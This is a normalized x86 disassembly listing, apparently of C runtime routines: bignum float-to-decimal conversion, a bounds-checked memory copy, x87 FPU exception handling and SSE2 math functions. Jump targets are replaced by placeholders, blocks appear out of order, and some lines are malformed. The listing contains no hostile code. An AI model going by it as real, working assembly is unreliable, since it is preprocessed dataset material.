mov eax [ ebp - 0x3a4 ]
mov [ ebp - 0x764 ] eax
test eax eax
je r-xdata
lea eax [ ebp - 0x960 ]
push eax
lea eax [ ebp - 0x3a0 ]
jmp r-xdata
cmp ecx [ ebp - 0x3a4 ]
lea edi [ ebp - 0x570 ]
setb al
test al al
jne r-xdata
mov edi [ ebp - 0x3a0 ]
mov eax ecx
shl eax 0x2
push eax
lea eax [ ebp - 0x570 ]
mov [ ebp - 0x3a4 ] ecx
push eax
lea eax [ ebp - 0x3a0 ]
push ebx
push eax
call sub_442e6b
add esp 0x10
test edi edi
jne r-xdata
cmp edi 0x1
je r-xdata
xor eax eax
mov [ ebp - 0x744 ] eax
mov [ ebp - 0x3a4 ] eax
jmp r-xdata
xor edi edi
lea eax [ ebp - 0x570 ]
inc edi
sub edi esi
mov ebx edi
shr ebx 0x5
mov esi ebx
shl esi 0x2
push esi
push 0x0
push eax
call sub_40dea0
xor eax eax
and edi 0x1f
inc eax
mov ecx edi
shl eax cl
mov [ ebp + esi - 0x570 ] eax
lea eax [ ebx + 0x1 ]
xor edx edx
mov edx [ edi - 0x4 ]
jmp r-xdata
lea eax [ esi - 0x1 ]
cmp eax ebx
jae r-xdata
mov [ ebp - 0x574 ] eax
mov ebx 0x1cc
mov [ ebp - 0x3a4 ] eax
shl eax 0x2
push eax
lea eax [ ebp - 0x570 ]
push eax
lea eax [ ebp - 0x3a0 ]
push ebx
push eax
call sub_442e6b
add esp 0x1c
cmp esi ebx
jae r-xdata
mov [ ebp - 0x1d4 ] edx
jmp r-xdata
lea eax [ edx + 0x1 ]
mov [ ebp - 0x1d4 ] eax
jmp r-xdata
xor edi edi
mov edi [ ecx ]
jmp r-xdata
test esi esi
je r-xdata
mov esi edx
lea eax [ ebp - 0x1d0 ]
mov edx [ ebp - 0x750 ]
sub esi edx
lea eax [ eax + esi * 4 ]
mov [ ebp - 0x74c ] eax
add al 0x30
lea esi [ edi + 0x1 ]
mov [ edi ] al
mov [ ebp - 0x74c ] esi
mov eax [ ebp - 0x76c ]
dec eax
jmp r-xdata
mov eax [ ebp - 0x76c ]
xor edi edi
mov esi eax
xor ecx ecx
mov edi esi
mov ecx [ ebp - 0x1d4 ]
cmp ecx 0x73
jae r-xdata
xor edi edi
xor esi esi
lea edx [ ebp - 0x1d0 ]
jmp r-xdata
lea edi [ ebp - 0x1d0 ]
lea edx [ ebp - 0x570 ]
cmp edi 0x1
je r-xdata
mov al 0x1
cmp [ ebp - 0x1d4 ] 0x0
je r-xdata
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_442e6b
add esp 0x10
xor esi esi
xor ecx ecx
push ebx
push eax
call sub_442e6b
add esp 0x10
lea edx [ ebp - 0x3a0 ]
jmp r-xdata
lea edi [ ebp - 0x3a0 ]
lea edx [ ebp - 0x570 ]
cmp edi 0x1
je r-xdata
xor eax eax
mov [ ebp - 0x574 ] eax
mov [ ebp - 0x3a4 ] eax
push eax
lea eax [ ebp - 0x570 ]
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x3a4 ] 0x0
je r-xdata
push eax
lea eax [ ebp - 0x740 ]
mov esi [ ebp - 0x74c ]
mov ebx [ ebp - 0x1d4 ]
jmp r-xdata
mov eax [ ebp - 0x750 ]
sub edi 0x4
add eax eax
shr edx 0x1f
xor edx eax
mov eax [ ebp - 0x754 ]
dec esi
mov [ eax ] edx
sub eax 0x4
mov [ ebp - 0x754 ] eax
cmp esi 0xffffffff
je r-xdata
and [ ebp - 0x56c ] 0x0
xor eax eax
inc eax
mov [ ebp - 0x570 ] esi
mov [ ebp - 0x574 ] eax
mov [ ebp - 0x3a4 ] eax
push 0x4
jmp r-xdata
xor eax eax
mov eax [ ecx - 0x4 ]
jmp r-xdata
lea eax [ esi - 0x1 ]
cmp eax ebx
jae r-xdata
cmp [ ebp - 0x745 ] 0x0
mov ebx 0x1cc
je r-xdata
mov ecx esi
lea edi [ ebp - 0x1d0 ]
xor eax eax
[ edi ]
mov edx [ ebp - 0x754 ]
mov esi [ ebp - 0x750 ]
cmp esi ebx
jae r-xdata
mov eax [ ebp + 0x1c ]
dec eax
cmp eax ecx
jb r-xdata
cmp ecx 0x7fffffff
ja r-xdata
mov ecx [ ebp - 0x780 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x778 ]
test eax eax
js r-xdata
mov eax [ ebp + ecx * 4 - 0x3a0 ]
mul edx
push 0xa
add eax edi
mov [ ebp + ecx * 4 - 0x3a0 ] eax
adc edx 0x0
inc ecx
mov edi edx
pop edx
cmp ecx esi
jne r-xdata
mov esi [ ebp - 0x74c ]
test edi edi
je r-xdata
xor eax eax
push eax
mov [ ebp - 0x964 ] eax
mov [ ebp - 0x1d4 ] eax
lea eax [ ebp - 0x960 ]
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_442e6b
add esp 0x10
mov eax edx
mov [ ebp + ecx * 4 - 0x1d0 ] eax
inc [ ebp - 0x1d4 ]
jmp r-xdata
mul [ ebp + esi * 4 - 0x1d0 ]
add eax edi
mov [ ebp + esi * 4 - 0x1d0 ] eax
mov eax [ ebp - 0x764 ]
adc edx 0x0
inc esi
mov edi edx
cmp esi ecx
jne r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x770 ] edx
test al al
jne r-xdata
mov [ ebp - 0x750 ] ecx
test al al
je r-xdata
mov ecx [ ebp - 0x1d4 ]
cmp [ ebp - 0x1d4 ] 0x0
je r-xdata
and [ ebp - 0x964 ] 0x0
and [ ebp - 0x1d4 ] 0x0
push 0x0
jmp r-xdata
mov eax [ ebp - 0x754 ]
sub eax [ ebp - 0x74c ]
mov [ ebp - 0x754 ] eax
jne r-xdata
mov eax [ ebp - 0x1d4 ]
xor ecx ecx
mov [ ebp - 0x764 ] eax
xor esi esi
mov eax edi
mul [ ebp + ecx * 4 - 0x3a0 ]
add eax esi
mov [ ebp + ecx * 4 - 0x3a0 ] eax
adc edx 0x0
inc ecx
mov esi edx
cmp ecx [ ebp - 0x764 ]
jne r-xdata
test esi esi
je r-xdata
mov [ ebp - 0x750 ] edx
test al al
jne r-xdata
mov [ ebp - 0x754 ] ecx
test al al
je r-xdata
mov ecx [ ebp - 0x3a4 ]
cmp [ ebp - 0x3a4 ] 0x0
je r-xdata
push eax
lea eax [ ebp - 0x3a0 ]
push ebx
push eax
call sub_442e6b
add esp 0x10
and [ ebp - 0x964 ] 0x0
and [ ebp - 0x3a4 ] 0x0
push 0x0
mov eax [ ebp - 0x770 ]
sub eax [ ebp - 0x75c ]
mov [ ebp - 0x770 ] eax
jne r-xdata
mov eax [ ebp - 0x3a4 ]
xor ecx ecx
mov [ ebp - 0x758 ] eax
xor esi esi
cmp esi ebx
jae r-xdata
mov ebx [ ebp - 0x1d4 ]
jmp r-xdata
and edi [ ebp - 0x758 ]
and eax [ ebp - 0x774 ]
mov ecx [ ebp - 0x750 ]
shl edi cl
mov ecx [ ebp - 0x770 ]
shr eax cl
mov ecx [ ebp - 0x75c ]
or edi eax
mov eax [ ebp - 0x754 ]
sub ecx 0x4
mov [ ebp - 0x75c ] ecx
mov [ ebp + eax * 4 - 0x1d0 ] edi
dec eax
dec esi
mov [ ebp - 0x754 ] eax
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x1d4 ] edx
jmp r-xdata
lea eax [ edx + 0x1 ]
mov [ ebp - 0x1d4 ] eax
jmp r-xdata
xor edi edi
mov edi [ eax ]
jmp r-xdata
add eax [ ebp - 0x77c ]
mov [ ebp - 0x778 ] eax
cmp esi eax
je r-xdata
mov eax ecx
add ecx eax
mov eax [ ebp - 0x3a4 ]
cmp eax 0x73
jae r-xdata
mov eax [ ebp - 0x1d4 ]
cmp eax 0x73
jae r-xdata
xor edx edx
xor esi esi
mov [ ebp - 0x744 ] edx
test ecx ecx
je r-xdata
mov eax [ ebp - 0x1d4 ]
mov [ ebp - 0x760 ] eax
mov eax [ ebp - 0x1d4 ]
xor ecx ecx
mov [ ebp - 0x764 ] eax
xor esi esi
lea eax [ ebp - 0x960 ]
push eax
lea eax [ ebp - 0x1d0 ]
mov ecx [ ebp - 0x758 ]
mov eax edi
mul [ ebp + esi * 4 - 0x1d0 ]
add eax ecx
mov [ ebp + esi * 4 - 0x1d0 ] eax
adc edx 0x0
inc esi
mov ecx edx
cmp esi [ ebp - 0x764 ]
jne r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp - 0x3a4 ]
cmp eax 0x73
jae r-xdata
xor edx edx
xor esi esi
mov [ ebp - 0x744 ] edx
test ecx ecx
je r-xdata
mov eax [ ebp - 0x3a4 ]
mov [ ebp - 0x760 ] eax
mov eax [ ebp - 0x3a4 ]
xor ecx ecx
mov [ ebp - 0x758 ] eax
xor esi esi
mov ecx [ ebp - 0x764 ]
mov eax edi
mul [ ebp + esi * 4 - 0x3a0 ]
add eax ecx
mov [ ebp + esi * 4 - 0x3a0 ] eax
adc edx 0x0
inc esi
mov ecx edx
cmp esi [ ebp - 0x758 ]
jne r-xdata
jmp r-xdata
cmp eax edx
jb r-xdata
and [ ebp - 0x56c ] 0x0
xor ecx ecx
push 0x4
pop eax
inc ecx
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x574 ] ecx
mov [ ebp - 0x3a4 ] ecx
push eax
xor eax eax
mov eax [ ebp - 0x74c ]
mov eax [ eax - 0x4 ]
jmp r-xdata
lea eax [ esi - 0x1 ]
cmp eax ebx
jae r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov eax [ ebp - 0x1d4 ]
test eax eax
je r-xdata
xor eax eax
push eax
mov [ ebp - 0x964 ] eax
mov [ ebp - 0x3a4 ] eax
lea eax [ ebp - 0x960 ]
push eax
lea eax [ ebp - 0x3a0 ]
push ebx
push eax
call sub_442e6b
add esp 0x10
jmp r-xdata
mov [ ebp + eax * 4 - 0x3a0 ] edi
inc [ ebp - 0x3a4 ]
jmp r-xdata
mov [ ebp + eax * 4 - 0x1d0 ] edi
inc [ ebp - 0x1d4 ]
jmp r-xdata
mov eax edx
mov [ ebp - 0x1d4 ] edx
shl eax 0x2
push eax
lea eax [ ebp - 0x740 ]
lea eax [ ebp - 0x740 ]
sub edi eax
mov [ ebp - 0x784 ] edi
mov eax edi
mul [ ebp + esi * 4 - 0x1d0 ]
add eax ecx
mov [ ebp + esi * 4 - 0x1d0 ] eax
adc edx 0x0
inc esi
mov ecx edx
cmp esi [ ebp - 0x764 ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x1d4 ]
cmp eax 0x73
jae r-xdata
mov [ ebp + eax * 4 - 0x3a0 ] esi
inc [ ebp - 0x3a4 ]
jmp r-xdata
mov eax edx
mov [ ebp - 0x3a4 ] edx
shl eax 0x2
lea eax [ ebp - 0x740 ]
sub edi eax
mov [ ebp - 0x784 ] edi
mov eax edi
mul [ ebp + esi * 4 - 0x3a0 ]
add eax ecx
mov [ ebp + esi * 4 - 0x3a0 ] eax
adc edx 0x0
inc esi
mov ecx edx
cmp esi [ ebp - 0x758 ]
jne r-xdata
test ecx ecx
je r-xdata
mov ebx [ ebp - 0x1d4 ]
jmp r-xdata
and eax [ ebp - 0x774 ]
and edi [ ebp - 0x758 ]
mov ecx [ ebp - 0x770 ]
shr eax cl
mov ecx [ ebp - 0x75c ]
shl edi cl
mov ecx [ ebp - 0x760 ]
or eax edi
mov [ ebp + ecx * 4 - 0x1d0 ] eax
dec ecx
mov eax [ ebp - 0x74c ]
dec esi
sub eax 0x4
mov [ ebp - 0x760 ] ecx
mov [ ebp - 0x74c ] eax
cmp ecx 0xffffffff
je r-xdata
xor edi edi
mov esi eax
xor ecx ecx
xor eax eax
xor edi edi
mov ecx esi
mov [ ebp - 0x75c ] eax
cmp [ ebp - 0x760 ] eax
je r-xdata
cmp esi edx
jne r-xdata
xor eax eax
push eax
mov [ ebp - 0x964 ] eax
mov [ ebp - 0x1d4 ] eax
lea eax [ ebp - 0x960 ]
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_442e6b
add esp 0x10
xor al al
jmp r-xdata
mov [ ebp + eax * 4 - 0x1d0 ] ecx
inc [ ebp - 0x1d4 ]
jmp r-xdata
xor eax eax
xor edi edi
mov ecx esi
mov [ ebp - 0x74c ] eax
cmp [ ebp - 0x760 ] eax
je r-xdata
cmp esi edx
jne r-xdata
mov eax [ ebp - 0x3a4 ]
cmp eax 0x73
jb r-xdata
cmp ecx edx
jb r-xdata
mov eax [ ebp + ecx * 4 - 0x1d0 ]
mov edx 0x3b9aca00
mul edx
add eax edi
mov [ ebp + ecx * 4 - 0x1d0 ] eax
adc edx 0x0
inc ecx
mov edi edx
cmp ecx esi
jne r-xdata
mov esi [ ebp - 0x74c ]
test edi edi
je r-xdata
cmp ecx 0x73
je r-xdata
cmp ecx 0x73
je r-xdata
inc esi
cmp esi ecx
jne r-xdata
and [ ebp + esi * 4 - 0x740 ] eax
lea edx [ esi + 0x1 ]
mov [ ebp - 0x744 ] edx
jmp r-xdata
test al al
je r-xdata
cmp ecx 0x73
je r-xdata
cmp ecx 0x73
je r-xdata
inc esi
cmp esi ecx
jne r-xdata
and [ ebp + esi * 4 - 0x740 ] eax
lea edx [ esi + 0x1 ]
mov [ ebp - 0x744 ] edx
jmp r-xdata
mov [ ebp + eax * 4 - 0x3a0 ] ecx
inc [ ebp - 0x3a4 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x574 ] eax
mov [ ebp - 0x3a4 ] eax
push eax
lea eax [ ebp - 0x570 ]
jmp r-xdata
lea eax [ ebp - 0x3a4 ]
push eax
lea eax [ ebp - 0x1d4 ]
push eax
call sub_4409b0
pop ecx
pop ecx
mov ecx [ ebp - 0x778 ]
push 0x8
pop edi
sub ecx esi
mov eax [ ebp - 0x1d4 ]
cmp eax 0x73
jae r-xdata
mov edi [ ebp - 0x784 ]
mov ecx [ ebp - 0x750 ]
test edi edi
je r-xdata
cmp ecx edx
jne r-xdata
lea eax [ edi + esi * 4 ]
mov eax [ ebp + eax - 0x740 ]
mov [ ebp - 0x764 ] eax
test eax eax
jne r-xdata
xor eax eax
mov [ ebp - 0x964 ] eax
mov [ ebp - 0x3a4 ] eax
push eax
lea eax [ ebp - 0x960 ]
mov edi [ ebp - 0x784 ]
mov ecx [ ebp - 0x754 ]
test edi edi
je r-xdata
cmp ecx edx
jne r-xdata
lea eax [ edi + esi * 4 ]
mov eax [ ebp + eax - 0x740 ]
mov [ ebp - 0x758 ] eax
test eax eax
jne r-xdata
push eax
lea eax [ ebp - 0x3a0 ]
push ebx
push eax
call sub_442e6b
add esp 0x10
xor al al
jmp r-xdata
dec edi
cmp edi 0xffffffff
jne r-xdata
mov [ edi + esi ] dl
xor eax eax
push eax
mov [ ebp - 0x964 ] eax
mov [ ebp - 0x1d4 ] eax
lea eax [ ebp - 0x960 ]
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_442e6b
add esp 0x10
mov [ ebp + eax * 4 - 0x1d0 ] edi
inc [ ebp - 0x1d4 ]
jmp r-xdata
cmp ecx 0x73
je r-xdata
mov edx [ ebp - 0x770 ]
mov eax [ edx + eax * 4 ]
mul [ ebp - 0x764 ]
add eax edi
adc edx 0x0
add [ ebp + ecx * 4 - 0x740 ] eax
mov eax [ ebp - 0x75c ]
adc edx 0x0
inc eax
inc ecx
mov [ ebp - 0x75c ] eax
mov edi edx
mov edx [ ebp - 0x744 ]
cmp eax [ ebp - 0x760 ]
jne r-xdata
and [ ebp + ecx * 4 - 0x740 ] 0x0
inc eax
add eax esi
mov [ ebp - 0x744 ] eax
mov eax [ ebp - 0x75c ]
test al al
je r-xdata
cmp ecx 0x73
je r-xdata
mov edx [ ebp - 0x750 ]
mov eax [ edx + eax * 4 ]
mul [ ebp - 0x758 ]
add eax edi
adc edx 0x0
add [ ebp + ecx * 4 - 0x740 ] eax
mov eax [ ebp - 0x74c ]
adc edx 0x0
inc eax
inc ecx
mov [ ebp - 0x74c ] eax
mov edi edx
mov edx [ ebp - 0x744 ]
cmp eax [ ebp - 0x760 ]
jne r-xdata
and [ ebp + ecx * 4 - 0x740 ] 0x0
inc eax
add eax esi
mov [ ebp - 0x744 ] eax
mov eax [ ebp - 0x74c ]
xor edx edx
div [ ebp - 0x774 ]
add dl 0x30
cmp ecx edi
jb r-xdata
cmp ecx 0x9
jbe r-xdata
cmp ecx edx
jne r-xdata
cmp ecx edx
jne r-xdata
add esi ecx
mov [ ebp - 0x74c ] esi
cmp esi [ ebp - 0x778 ]
jne r-xdata
push 0x9
pop ecx
mov eax edi
xor edi edi
add [ ebp + ecx * 4 - 0x740 ] eax
mov edx [ ebp - 0x744 ]
adc edi edi
inc ecx
jmp r-xdata
and [ ebp + ecx * 4 - 0x740 ] 0x0
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x744 ] eax
mov eax edi
xor edi edi
add [ ebp + ecx * 4 - 0x740 ] eax
mov edx [ ebp - 0x744 ]
adc edi edi
inc ecx
jmp r-xdata
and [ ebp + ecx * 4 - 0x740 ] 0x0
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x744 ] eax
sub_442e6b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
call sub_430f56
push 0x16
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push eax
call sub_40dea0
add esp 0xc
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
call sub_430f56
push 0x16
jmp r-xdata
push esi
push edi
push eax
call sub_40d920
add esp 0xc
xor eax eax
jmp r-xdata
push 0x16
pop eax
call sub_430f56
push 0x22
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
pop edi
sub_442ef0
cmp [ edx + 0xe ] 0x5
jne r-xdata
mov bx 0x133f
mov bx [ ebp - 0xa4 ]
or bh 0x2
and bh 0xfe
mov bl 0x3f
jmp r-xdata
mov [ ebp - 0xa2 ] bx
fldcw [ ebp - 0xa2 ]
mov ebx r--data
fxam
mov [ ebp - 0x94 ] edx
fwait
fnstsw [ ebp - 0xa0 ]
mov [ ebp - 0x90 ] 0x0
fwait
mov cl [ ebp - 0x9f ]
shl cl 0x1
sar cl 0x1
rol cl 0x1
mov al cl
and al 0xf
xlat
movsx eax al
and ecx 0x404
mov ebx edx
add ebx eax
add ebx 0x10
jmp [ ebx ]
sub_442f57
cmp [ edx + 0xe ] 0x5
jne r-xdata
mov bx 0x133f
mov bx [ ebp - 0xa4 ]
or bh 0x2
and bh 0xfe
mov bl 0x3f
jmp r-xdata
mov [ ebp - 0xa2 ] bx
fldcw [ ebp - 0xa2 ]
mov ebx r--data
fxam
mov [ ebp - 0x94 ] edx
fwait
fnstsw [ ebp - 0xa0 ]
mov [ ebp - 0x90 ] 0x0
fxch st1
mov cl [ ebp - 0x9f ]
fxam
fwait
fnstsw [ ebp - 0xa0 ]
fxch st1
mov ch [ ebp - 0x9f ]
shl ch 0x1
sar ch 0x1
rol ch 0x1
mov al ch
and al 0xf
xlat
mov ah al
shl cl 0x1
sar cl 0x1
rol cl 0x1
mov al cl
and al 0xf
xlat
shl ah 0x1
shl ah 0x1
or al ah
movsx eax al
and ecx 0x404
mov ebx edx
add ebx eax
add ebx 0x10
jmp [ ebx ]
sub_443064
fstp [ ebp - 0x9e ]
fld [ ebp - 0x9e ]
test [ ebp - 0x97 ] 0x40
je r-xdata
mov [ ebp - 0x90 ] 0x1
fxch st1
fstp [ ebp - 0x9e ]
fld [ ebp - 0x9e ]
test [ ebp - 0x97 ] 0x40
je r-xdata
mov [ ebp - 0x90 ] 0x0
jmp r-xdata
faddp st1
retn
sub_4430f9
mov edi edi
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x10 ]
push esi
mov esi [ ebx + 0xc ]
push edi
movzx ecx [ eax ]
mov [ ebp - 0x84 ] ecx
mov eax [ esi ]
sub eax 0x1
je r-xdata
push 0x8
sub eax 0x1
je r-xdata
mov ecx [ ebp - 0x84 ]
mov ecx [ ebx + 0x8 ]
cmp ecx 0x10
je r-xdata
push 0x4
jmp r-xdata
sub eax 0x1
je r-xdata
push [ esi ]
call sub_446abb
pop ecx
call sub_429e4e
test al al
je r-xdata
mov eax [ ebp - 0x40 ]
fld [ esi + 0x10 ]
and eax 0xffffffe3
or eax 0x3
fstp [ ebp - 0x50 ]
mov [ ebp - 0x40 ] eax
cmp ecx 0x16
je r-xdata
pop edi
push ecx
lea eax [ esi + 0x18 ]
push eax
push edi
call sub_446597
add esp 0xc
test eax eax
jne r-xdata
push 0x11
jmp r-xdata
sub eax 0x1
je r-xdata
push esi
call sub_429e7b
pop ecx
test eax eax
jne r-xdata
cmp ecx 0x1d
je r-xdata
push 0x12
jmp r-xdata
sub eax 0x1
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
and [ ebp - 0x40 ] 0xfffffffe
jmp r-xdata
sub eax 0x3
jne r-xdata
lea eax [ esi + 0x18 ]
push eax
lea eax [ esi + 0x8 ]
push eax
push ecx
push edi
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_446784
add esp 0x18
push 0xffff
push ecx
call sub_444eaf
cmp [ esi ] 0x8
pop ecx
pop ecx
je r-xdata
push 0x10
jmp r-xdata
sub_443213
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ rw-data ] 0x1
setge cl
neg eax
sbb eax eax
and eax ecx
mov [ rw-data ] eax
pop ebp
retn
sub_44325e
pextrw eax xmm0 0x3
and ax 0x7fff
sub ax 0x3030
cmp ax 0x10c5
ja r-xdata
jg r-xdata
movlpd xmm1 [ r--data ]
mulsd xmm1 xmm0
movlpd xmm2 [ r--data ]
cvtsd2si edx xmm1
addsd xmm1 xmm2
movlpd xmm3 [ r--data ]
subsd xmm1 xmm2
movapd xmm2 [ r--data ]
mulsd xmm3 xmm1
unpcklpd xmm1 xmm1
add edx 0x1c7610
movsd xmm4 xmm0
and edx 0x3f
movapd xmm5 [ r--data ]
lea eax [ r--data ]
shl edx 0x5
add eax edx
mulpd xmm2 xmm1
subsd xmm0 xmm3
mulsd xmm1 [ r--data ]
subsd xmm4 xmm3
movlpd xmm7 [ eax + 0x8 ]
unpcklpd xmm0 xmm0
movsd xmm3 xmm4
subsd xmm4 xmm2
mulpd xmm5 xmm0
subpd xmm0 xmm2
movapd xmm6 [ r--data ]
mulsd xmm7 xmm4
subsd xmm3 xmm4
mulpd xmm5 xmm0
mulpd xmm0 xmm0
subsd xmm3 xmm2
movapd xmm2 [ eax ]
subsd xmm1 xmm3
movlpd xmm3 [ eax + 0x18 ]
addsd xmm2 xmm3
subsd xmm7 xmm2
mulsd xmm2 xmm4
mulpd xmm6 xmm0
mulsd xmm3 xmm4
mulpd xmm2 xmm0
mulpd xmm0 xmm0
addpd xmm5 [ r--data ]
mulsd xmm4 [ eax ]
addpd xmm6 [ r--data ]
mulpd xmm5 xmm0
movsd xmm0 xmm3
addsd xmm3 [ eax + 0x8 ]
mulsd xmm1 xmm7
movsd xmm7 xmm4
addsd xmm4 xmm3
addpd xmm6 xmm5
movlpd xmm5 [ eax + 0x8 ]
subsd xmm5 xmm3
subsd xmm3 xmm4
addsd xmm1 [ eax + 0x10 ]
mulpd xmm6 xmm2
addsd xmm5 xmm0
addsd xmm3 xmm7
addsd xmm1 xmm5
addsd xmm1 xmm3
addsd xmm1 xmm6
unpckhpd xmm6 xmm6
addsd xmm1 xmm6
sub esp 0x10
addsd xmm4 xmm1
movlpd [ esp + 0x4 ] xmm4
fld [ esp + 0x4 ]
add esp 0x10
retn
jmp sub_435dcf
pextrw eax xmm0 0x3
and ax 0x7fff
pinsrw xmm0 eax 0x3
sub esp 0x10
movlpd xmm1 [ r--data ]
subsd xmm1 xmm0
movlpd [ esp + 0x4 ] xmm1
fld [ esp + 0x4 ]
add esp 0x10
retn
sub_443435
mov eax [ edx + 0x4 ]
and eax 0x7ff00000
cmp eax 0x7ff00000
je r-xdata
mov eax [ edx + 0x4 ]
sub esp 0xa
or eax 0x7fff0000
mov [ esp + 0x6 ] eax
mov eax [ edx + 0x4 ]
mov ecx [ edx ]
shld eax ecx 0xb
shl ecx 0xb
mov [ esp + 0x4 ] eax
mov [ esp ] ecx
fld [ esp ]
add esp 0xa
test eax 0x0
mov eax [ edx + 0x4 ]
retn
fld [ edx ]
retn
sub_4434c5
sub esp 0x8
fst [ esp ]
mov eax [ esp + 0x4 ]
add esp 0x8
and eax 0x7ff00000
jmp r-xdata
cmp eax 0x7ff00000
je r-xdata
fld [ r--data ]
fxch st1
fscale
fstp st1
fld st0
fabs
fcomp [ r--data ]
fwait
fnstsw ax
sahf
mov eax 0x3
jbe r-xdata
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
cmp edx 0x1d
je r-xdata
fmul [ r--data ]
jmp r-xdata
pop edx
retn
and ax 0x20
jne r-xdata
call sub_443580
pop edx
retn
call sub_443597
pop edx
retn
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
sub_443580
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
fstp [ ebp - 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
lea eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
push eax
push ecx
push edx
call sub_4430f9
add esp 0xc
fld [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x27f
je r-xdata
leave
retn
fldcw [ ebp + 0x8 ]
sub_443597
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x20 ] eax
fstp [ ebp - 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
lea eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
push eax
push ecx
push edx
call sub_4430f9
add esp 0xc
fld [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x27f
je r-xdata
leave
retn
fldcw [ ebp + 0x8 ]
sub_4435fe
pextrw eax xmm0 0x3
and ax 0x7fff
sub ax 0x3030
cmp ax 0x10c5
ja r-xdata
jg r-xdata
movlpd xmm1 [ r--data ]
mulsd xmm1 xmm0
movlpd xmm2 [ r--data ]
cvtsd2si edx xmm1
addsd xmm1 xmm2
movlpd xmm3 [ r--data ]
subsd xmm1 xmm2
movapd xmm2 [ r--data ]
mulsd xmm3 xmm1
unpcklpd xmm1 xmm1
add edx 0x1c7600
movsd xmm4 xmm0
and edx 0x3f
movapd xmm5 [ r--data ]
lea eax [ r--data ]
shl edx 0x5
add eax edx
mulpd xmm2 xmm1
subsd xmm0 xmm3
mulsd xmm1 [ r--data ]
subsd xmm4 xmm3
movlpd xmm7 [ eax + 0x8 ]
unpcklpd xmm0 xmm0
movsd xmm3 xmm4
subsd xmm4 xmm2
mulpd xmm5 xmm0
subpd xmm0 xmm2
movapd xmm6 [ r--data ]
mulsd xmm7 xmm4
subsd xmm3 xmm4
mulpd xmm5 xmm0
mulpd xmm0 xmm0
subsd xmm3 xmm2
movapd xmm2 [ eax ]
subsd xmm1 xmm3
movlpd xmm3 [ eax + 0x18 ]
addsd xmm2 xmm3
subsd xmm7 xmm2
mulsd xmm2 xmm4
mulpd xmm6 xmm0
mulsd xmm3 xmm4
mulpd xmm2 xmm0
mulpd xmm0 xmm0
addpd xmm5 [ r--data ]
mulsd xmm4 [ eax ]
addpd xmm6 [ r--data ]
mulpd xmm5 xmm0
movsd xmm0 xmm3
addsd xmm3 [ eax + 0x8 ]
mulsd xmm1 xmm7
movsd xmm7 xmm4
addsd xmm4 xmm3
addpd xmm6 xmm5
movlpd xmm5 [ eax + 0x8 ]
subsd xmm5 xmm3
subsd xmm3 xmm4
addsd xmm1 [ eax + 0x10 ]
mulpd xmm6 xmm2
addsd xmm5 xmm0
addsd xmm3 xmm7
addsd xmm1 xmm5
addsd xmm1 xmm3
addsd xmm1 xmm6
unpckhpd xmm6 xmm6
addsd xmm1 xmm6
sub esp 0x10
addsd xmm4 xmm1
movlpd [ esp + 0x4 ] xmm4
fld [ esp + 0x4 ]
add esp 0x10
retn
jmp sub_435eff
sub esp 0x10
shr ax 0x4
cmp ax 0xcfd
jne r-xdata
movlpd xmm3 [ r--data ]
mulsd xmm3 xmm0
subsd xmm3 xmm0
mulsd xmm3 [ r--data ]
movlpd [ esp + 0x4 ] xmm0
fld [ esp + 0x4 ]
add esp 0x10
retn
mulsd xmm0 [ r--data ]
movlpd [ esp + 0x4 ] xmm0
fld [ esp + 0x4 ]
add esp 0x10
retn
sub_4437b0
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
